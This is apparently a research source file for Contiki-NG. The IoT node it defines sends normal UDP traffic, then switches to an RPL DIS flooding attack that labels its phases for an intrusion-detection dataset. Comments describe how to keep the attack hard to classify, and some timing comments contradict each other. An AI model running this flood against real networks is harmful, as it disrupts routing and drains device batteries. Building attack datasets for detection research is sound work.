#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "net/mac/4emac/4emac-private.h"
#include "net/app-layer/attack-analyzer/attacker-analyzer.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

/* For normal mode */
#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678
#define NORMAL_SEND_INTERVAL (15 * CLOCK_SECOND)
#define JRC_IP_ADDR { 0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 }
static uip_ipaddr_t jrc_ip_addr;
static struct simple_udp_connection udp_conn;

/*
 * v4: REAL DIS flood. The [60s,120s] interval was not a flood in the
 * literature sense (normal post-join DIS ~0; the interval was much slower
 * than the DIO Trickle Imin=2^12ms~4s, so neighbour Trickle fully recovered).
 * The interval was pulled down to around/below Imin: jittered [2s,6s]. This
 * pins the neighbours' DIO Trickle timer to Imin -> a real DIO storm plus an
 * energy-consumption signature.
 * NOTE: the dis_sent feature therefore leaves a strong signature (expected,
 * correct behaviour). Non-trivial classification stealth now comes NOT from
 * lowering the interval, but from a per-run random attacker identity plus
 * on/off windows.
 */
#define ATTACK_MIN_INTERVAL (2 * CLOCK_SECOND)
#define ATTACK_MAX_INTERVAL (6 * CLOCK_SECOND)
/* Stabilization hold: in a real flood, pausing on parent/rank fluctuation
 * undermines the flood (the flood itself creates that fluctuation). 0 =
 * disabled; even if the logic stops, at most a single DIS is skipped. */
#define STABILITY_HOLDOFF   (0)
/* Short settle before the first DIS when entering attack mode (the old 120s
 * flood consumed roughly its first ~2 min). */
#define ATTACK_INITIAL_HOLDOFF (5 * CLOCK_SECOND)

/*
 * Phase-transition timing: in the 30-min headless run scheme the attack phase
 * opens at the end of minute 3 (when the attacker-analyzer warmup ends). Since
 * the DIS attack is routing-independent, no DODAG join phase duration is needed.
 */
#define ATTACK_DELAY_MIN (20 * 60 * CLOCK_SECOND)  // 60-min run; attack start random in [20,25] min
#define ATTACK_DELAY_MAX (25 * 60 * CLOCK_SECOND)

/*---------------------------------------------------------------------------*/
PROCESS(hybrid_client_process, "Hybrid Normal/DIS-Attack client");
AUTOSTART_PROCESSES(&hybrid_client_process);
/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
         const uip_ipaddr_t *sender_addr,
         uint16_t sender_port,
         const uip_ipaddr_t *receiver_addr,
         uint16_t receiver_port,
         const uint8_t *data,
         uint16_t datalen)
{
  unsigned count = *(unsigned *)data;
  LOG_INFO("Received response %u from ", count);
  LOG_INFO_6ADDR(sender_addr);
  LOG_INFO_("\n");
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(hybrid_client_process, ev, data)
{
    static struct etimer periodic_timer;
    static struct etimer attack_delay_timer;
    static struct etimer app_send_timer;
    static unsigned count = 0;
    uip_ipaddr_t dest_ipaddr;
    /* Local state for route-stability monitoring */
    static uip_ipaddr_t last_parent_ip_local;
    static uint16_t last_rank_local = 0;
    static clock_time_t holdoff_until = 0;

    PROCESS_BEGIN();

    /* --- Initialization for normal operation --- */
    uint8_t jrc_addr[16] = JRC_IP_ADDR;
    memcpy(jrc_ip_addr.u8, jrc_addr, 16);
    simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                        UDP_SERVER_PORT, udp_rx_callback);
    foure_timesynch_init(0);

    /* Initial state for route-stability monitoring */
    uip_create_unspecified(&last_parent_ip_local);

    /* Start the attacker analyzer: first-phase label is no attack (0, ATTACK_TYPE_NONE) */
    attacker_analyzer_init(0, &udp_conn, (void *)&jrc_ip_addr, (unsigned short)UDP_SERVER_PORT, 0, ATTACK_TYPE_NONE);

    LOG_INFO("Node starting in normal mode. DIS attack will begin in 15 minutes.\n");
    clock_time_t attack_delay = ATTACK_DELAY_MIN + (random_rand() % (ATTACK_DELAY_MAX - ATTACK_DELAY_MIN));
    LOG_INFO("Attack delay drawn: %lu sec (uniform [20,25] min)\n", (unsigned long)(attack_delay / CLOCK_SECOND));
    etimer_set(&attack_delay_timer, attack_delay);
    etimer_set(&periodic_timer, random_rand() % NORMAL_SEND_INTERVAL);

    /* --- Normal Phase Loop (first 15 minutes) --- */
    while(!etimer_expired(&attack_delay_timer)) {
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));


        if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
            LOG_INFO("Sending normal UDP packet %u to ", count);
            LOG_INFO_6ADDR(&dest_ipaddr);
            LOG_INFO_("\n");
            {
              uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
              simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
            }
            count++;
            /* Update packet count for analyzer */
            attacker_analyzer_set_app_packet_count(count);
        } else {
            LOG_INFO("Normal mode: Not reachable yet\n");
        }

        /* Add some jitter */
        etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL
          - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
    }

    /* --- Attack Phase Loop --- */
    LOG_INFO("Attack phase started. DIS messages will be sent periodically.\n");
    /* Update the label to attack: 1, ATTACK_TYPE_DIS */
    attacker_analyzer_set_attack_mode(1, ATTACK_TYPE_DIS);
    /* WAIT before first send: short settle (ATTACK_INITIAL_HOLDOFF), plus a random [ATTACK_MIN, ATTACK_MAX) */
    {
      clock_time_t delta = (ATTACK_MAX_INTERVAL > ATTACK_MIN_INTERVAL) ? (ATTACK_MAX_INTERVAL - ATTACK_MIN_INTERVAL) : 0;
      clock_time_t off = (delta > 0) ? (clock_time_t)(random_rand() % delta) : 0;
      etimer_set(&periodic_timer, ATTACK_INITIAL_HOLDOFF + ATTACK_MIN_INTERVAL + off);
    }

    etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL);

    while(1) {
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer) ||
                                 etimer_expired(&app_send_timer));

        /* --- DIS attack branch --- */
        if(etimer_expired(&periodic_timer)) {
          /* --- Route/sync stability check --- */
          int can_send = 1;
          clock_time_t now = clock_time();
          if(now < holdoff_until) {
            can_send = 0;
          }
          if(can_send && !NETSTACK_ROUTING.node_is_reachable()) {
            can_send = 0;
          }
          if(can_send) {
            rpl_dag_t *dag = rpl_get_any_dag();
            if(dag && dag->preferred_parent) {
              const uip_ipaddr_t *p = rpl_parent_get_ipaddr(dag->preferred_parent);
              uint16_t rank_now = dag->rank;
              if(!uip_ipaddr_cmp(&last_parent_ip_local, p)) {
                uip_ipaddr_copy(&last_parent_ip_local, p);
                holdoff_until = now + STABILITY_HOLDOFF;
                can_send = 0;
                LOG_INFO("DIS skipped: new parent, waiting for stabilization.\n");
              } else if((last_rank_local != 0) && (rank_now > last_rank_local ? (rank_now - last_rank_local) : (last_rank_local - rank_now)) >= 256) {
                holdoff_until = now + STABILITY_HOLDOFF;
                can_send = 0;
                LOG_INFO("DIS skipped: rank fluctuation, waiting for stabilization.\n");
              }
              last_rank_local = rank_now;
            }
          }
          if(can_send) {
            LOG_INFO("Sending a DIS message (multicast)\n");
            dis_output(NULL);
          }
          {
            clock_time_t delta = (ATTACK_MAX_INTERVAL > ATTACK_MIN_INTERVAL) ? (ATTACK_MAX_INTERVAL - ATTACK_MIN_INTERVAL) : 0;
            clock_time_t off = (delta > 0) ? (clock_time_t)(random_rand() % delta) : 0;
            etimer_set(&periodic_timer, ATTACK_MIN_INTERVAL + off);
          }
        }

        /* --- Normal app-send branch (stealth: keep sending UDP during attack) --- */
        if(etimer_expired(&app_send_timer)) {
          if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
            uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
            simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
            count++;
            attacker_analyzer_set_app_packet_count(count);
          }
          etimer_set(&app_send_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
        }
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/